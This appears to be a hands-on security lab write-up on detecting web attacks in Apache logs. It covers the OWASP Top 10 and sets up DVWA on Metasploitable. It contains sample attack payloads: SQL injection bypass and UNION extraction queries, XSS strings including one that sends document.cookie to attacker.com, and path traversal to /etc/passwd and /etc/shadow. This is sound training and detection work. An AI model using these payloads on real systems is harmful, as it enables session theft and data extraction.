## Project Overview

In this lab, I'll learn how to identify common attacks against web applications by analyzing web server logs (Apache, Nginx). I'll detect SQL injection, Cross-Site Scripting (XSS), path traversal, and other attacks from the OWASP Top 10. This skill is critical because web applications are the #1 target of attackers.

**Real-world scenario:**

I'm a SOC Analyst, and the development team reports suspicious activity on the corporate web application. The WAF (Web Application Firewall) is generating alerts. 

My job is to:

- Analyze web server logs.
- Identify attack patterns.
- Determine if there was a successful compromise.
- Extract IOCs (attacking IPs, malicious URLs).
- Recommend mitigation.

---

## Prerequisites

- Lab 1.1.5 completed (phishing email analysis)
- Kali + Metasploitable VMs operational
- Network connectivity verified
- Basic HTTP/web fundamentals
- Python 3 installed

## LAB ENVIRONMENT

- Attacker VM: Kali Linux (analysis + attack generation)
- Target VM: Metasploitable 2 (vulnerable web apps)
- Web Server: Apache (on Metasploitable)
-Web Apps: DVWA, Mutillidae (intentionally vulnerable)
- Logs Location: /var/log/apache2/access.log

## TOOLS USED – Web Security & Log Analysis

| Tool                  | Purpose                          | Why This Tool?                          |
|-----------------------|----------------------------------|-----------------------------------------|
| Apache/Nginx Logs     | Web server access logs           | Industry standard, universal            |
| grep / awk / sed      | Log parsing and filtering        | CLI mastery, automation-ready           |
| Python                | Log analysis automation          | Scalable, repeatable analysis           |
| Burp Suite Community  | Manual attack testing            | #1 web security testing tool            |
| OWASP ZAP             | Automated vulnerability scanning | Free, open-source alternative           |
| Metasploitable        | Vulnerable web app target        | Safe, legal practice environment        |


## Objectives

-  Understand OWASP Top 10 web vulnerabilities
-  Generate web attack traffic in controlled environment
-  Analyze Apache access logs for attack patterns
-  Detect SQL injection attempts
-  Identify XSS (Cross-Site Scripting) attacks
-  Recognize path traversal attacks
-  Spot command injection attempts
-  Identify brute force login patterns
-  Use grep/awk for log analysis
-  Create Python automation script
-  Extract attacker IPs and payloads

## STEP BY STEP - LABORATORY 1.1.6

STEP 1.1.6.1: Understanding Web Application Attacks 

***OWASP Top 10 (2021) - Most Critical Web Risk

## OWASP Top 10 – Web Security Risks

| #  | Risk Name                                | Description                              | Example                                              |
|----|------------------------------------------|------------------------------------------|------------------------------------------------------|
| 1  | **Broken Access Control**                | Unauthorized access to resources         | Accessing admin panel without authentication         |
| 2  | **Cryptographic Failures**               | Sensitive data exposure                  | Passwords stored in plaintext                        |
| 3  | **Injection**                            | SQL, Command, LDAP injection             | `' OR 1=1--` in login form                           |
| 4  | **Insecure Design**                      | Flawed architecture                      | Password reset without verification                  |
| 5  | **Security Misconfiguration**            | Default passwords, verbose errors        | Apache showing directory listings                    |
| 6  | **Vulnerable & Outdated Components**     | Unpatched libraries                      | Log4j vulnerability                                  |
| 7  | **Identification & Authentication Failures** | Weak password policies               | No account lockout after failed logins               |
| 8  | **Software & Data Integrity Failures**   | Unsigned updates, insecure deserialization | Tampering with serialized objects                 |
| 9  | **Security Logging & Monitoring Failures** | Insufficient logging                  | No audit trail of admin actions                      |
| 10 | **Server-Side Request Forgery (SSRF)**   | Server tricked into making requests      | Internal network scanning via web app               |

## Common Attack Types (Detailed):

1. **SQL Injection (SQLi)**

***Normal Query:***

```sql
SELECT * FROM users WHERE username='john' AND password='pass123'
```

***Attack Payload:***

```sql
' OR 1=1--
```

***Resulting Query:***

```bash
SELECT * FROM users WHERE username='' OR 1=1--' AND password='...'
                                        ^^^^^^ Always TRUE
                                              ^^ Comment out rest
```

Result: **Bypass authentication, login as any user**

**Detection in Logs:**


- **GET** /login.php?user=' OR 1=1--&pass=x
- **GET** /search.php?id=1 UNION SELECT username,password FROM users--
- **POST** /admin.php (payload in body: ' OR '1'='1)

2. **Cross-Site Scripting (XSS)**

***Normal Input:***

< input value="Hello" >

***Attack Payload:***

<script>alert('XSS')</script>

***Rendered:***

< input value="<script>alert('XSS')</script>" >

              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ Executes JavaScript!

***Advanced Attack:***

<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

Result: **Steals victim's session cookies**


**Detection in Logs:**


- **GET** /search.php?q=<script>alert(1)</script>
- **GET** /profile.php?name=<img src=x onerror=alert(1)>
- **POST** /comment.php (payload: <svg onload=alert(1)>)


3. **Path Traversal (Directory Traversal)**

***Normal Request:***

- GET /download.php?file=report.pdf

***Attack Payload:***

- GET /download.php?file=../../../../etc/passwd

Result: **Access sensitive files outside web root**


**Detection in Logs:**

- GET /page.php?file=../../etc/passwd
- GET /download.php?doc=....//....//etc/shadow
- GET /include.php?page=../../../../../../etc/passwd%00
                                                  ^^^ Null byte injection

## STEP 1.1.6.2: Setup Web Application Target

1. **Start Metasploitable Web Services:**

- login on Metasploitable VM

- Check if Apache is running

![1.1.6-WebApplication](/assets/screenshots/02-Web-Application-Security/Lab-1.1.6-WebApplication/Lab-1.1.6-WebApliccation.png)


2. **From Kali, Access Metasploitable Web Apps:**

 ***Verify connectivity***

 ```bash
ping -c 2 10.0.2.4
```

***Check if web server responds***

```bash
curl http://10.0.2.4
```

***Access in browser***

```bash
firefox http://10.0.2.4 &
```

3. **Setup DVWA (Primary Testing Target):**

***Access DVWA:***

```bash
URL: http://192.168.56.102/dvwa
```

Default credentials: **admin / password**

- Click "DVWA Security" 
- Set Security Level: **Low** 

## STEP 1.1.6.3: Generate Attack Traffic and Capture Logs

1. **Scenario 1: SQL Injection Attack**

 ***Payload 1: Basic authentication bypass***

 ```sql
' OR '1'='1
```

![1.1.6-WebApplication](/assets/screenshots/02-Web-Application-Security/Lab-1.1.6-WebApplication/Lab-1.1.6-WebApliccation1.png)

 ***Payload 2: UNION-based injection***

```sql
' UNION SELECT null, version()--
```


***Payload 3: Extract usernames and passwords***

```sql
' UNION SELECT user, password FROM users--
```


***Payload 4: Database enumeration***

```sql
' UNION SELECT null, database()--
```

***Payload 5: Table enumeration***

```sql
' UNION SELECT null, table_name FROM information_schema.tables--
```

